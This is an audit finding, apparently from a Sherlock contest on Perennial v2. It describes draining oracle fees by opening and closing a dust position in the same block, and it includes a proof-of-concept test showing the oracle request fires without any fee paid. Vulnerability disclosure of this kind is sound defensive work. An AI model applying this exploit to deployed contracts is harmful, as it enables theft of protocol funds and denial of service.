---
id: 25563
severity: "Medium"
---

# Drained oracle fees from market by depositing and withdrawing immediately without triggering settlement fees

## Description



## Proof of Concept

## Vulnerability Detail

`Market` advances in the id of the [`Global`](<https://github.com/sherlock-audit/2023-07-perennial/blob/main/perennial-v2/packages/perennial/contracts/Market.sol#L257-L260>) and [`Local`](<https://github.com/sherlock-audit/2023-07-perennial/blob/main/perennial-v2/packages/perennial/contracts/Market.sol#L261-L264>) states by fetching `latestVersion` and `currentTimestamp` from the oracle, increasing it if there is an update.

When a new position is updated by calling `update()`, if the order is [not empty](<https://github.com/sherlock-audit/2023-07-perennial/blob/main/perennial-v2/packages/perennial/contracts/Market.sol#L284>) (when there is a modification in the `maker` , `long` or `short` amounts), it requests a new version from the oracle. This means that users can trigger a request with the smallest position possible (1), not paying any fees.

Fetching a price in the oracle is expensive, thus `Perennial` attributes an `oracleFee` to the oracle, which is then [fed](<https://github.com/sherlock-audit/2023-07-perennial/blob/main/perennial-v2/packages/perennial-oracle/contracts/pyth/PythOracle.sol#L127>) to the `keeper` for commiting prices in the oracle. Notice that anyone can be the `keeper`, the only requirement is to submit a [valid price](<https://github.com/sherlock-audit/2023-07-perennial/blob/main/perennial-v2/packages/perennial-oracle/contracts/pyth/PythOracle.sol#L136>) to the oracle.

In the oracle, the incentive is only paid if there was a [previous request](<https://github.com/sherlock-audit/2023-07-perennial/blob/main/perennial-v2/packages/perennial-oracle/contracts/pyth/PythOracle.sol#L132>), most likely from `Market` (can be any [`authorized`](<https://github.com/sherlock-audit/2023-07-perennial/blob/main/perennial-v2/packages/perennial-oracle/contracts/pyth/PythOracle.sol#L77>) entity). As the `oracleFee` is only increased on settlements, an oracle request can be triggered at any block (only [1 request per block](<https://github.com/sherlock-audit/2023-07-perennial/blob/main/perennial-v2/packages/perennial-oracle/contracts/pyth/PythOracle.sol#L78-L80>) is allowed) by depositing and withdrawing in the same block, without providing any settlement fee.

Thus, this mechanism can be exploited to give maximum profit to the `keeper`, which would force the protocol to manually add fees to the oracle or be DoSed (could be both).

## Impact

Theft of yield and protocol funds by abusing the `keeper` role and DoS of the `Market`.

## Code Snippet

Added the following test to `Market.test.ts`, proving that the request can be triggered without paying any fees. The attacker would then proceed to commit a price to the oracle and get the fees (possible at every block), until there are no more fees in the `Market`.

```solidity
it.only('POC opens and closes the position to trigger an oracle request without paying any fee', async () => {
  const dustCollateral = parse6decimal("100");
  const dustPosition = parse6decimal ("0.000001");
  dsu.transferFrom.whenCalledWith(user.address, market.address, dustCollateral.mul(1e12)).returns(true)

  await expect(market.connect(user).update(user.address, dustPosition, 0, 0, dustCollateral, false))
    .to.emit(market, 'Updated')
    .withArgs(user.address, ORACLE_VERSION_2.timestamp, dustPosition, 0, 0, dustCollateral, false)

  expectLocalEq(await market.locals(user.address), {
    currentId: 1,
    latestId: 0,
    collateral: dustCollateral,
    reward: 0,
    protection: 0,
  })
  expectPositionEq(await market.positions(user.address), {
    ...DEFAULT_POSITION,
    timestamp: ORACLE_VERSION_1.timestamp,
  })
  expectPositionEq(await market.pendingPositions(user.address, 1), {
    ...DEFAULT_POSITION,
    timestamp: ORACLE_VERSION_2.timestamp,
    maker: dustPosition,
    delta: dustCollateral,
  })
  expectGlobalEq(await market.global(), {
    currentId: 1,
    latestId: 0,
    protocolFee: 0,
    oracleFee: 0,
    riskFee: 0,
    donation: 0,
  })
  expectPositionEq(await market.position(), {
    ...DEFAULT_POSITION,
    timestamp: ORACLE_VERSION_1.timestamp,
  })
  expectPositionEq(await market.pendingPosition(1), {
    ...DEFAULT_POSITION,
    timestamp: ORACLE_VERSION_2.timestamp,
    maker: dustPosition,
  })
  expectVersionEq(await market.versions(ORACLE_VERSION_1.timestamp), {
    makerValue: { _value: 0 },
    longValue: { _value: 0 },
    shortValue: { _value: 0 },
    makerReward: { _value: 0 },
    longReward: { _value: 0 },
    shortReward: { _value: 0 },
  })

  dsu.transfer.whenCalledWith(user.address, dustCollateral.mul(1e12)).returns(true)
  await expect(market.connect(user).update(user.address, 0, 0, 0, dustCollateral.mul(-1), false))
    .to.emit(market, 'Updated')
    .withArgs(user.address, ORACLE_VERSION_2.timestamp, 0, 0, 0, dustCollateral.mul(-1), false)

    expect(oracle.request).to.have.been.calledWith(user.address)
})
```

## Recommendation

Whitelist the keeper role to prevent malicious users from figuring out ways to profit from the incentive mechanism. Additionally, the whitelisted keppers could skip oracle requests if they don't contribute to settlements (when there are no orders to settle), to ensure that funds are always available.
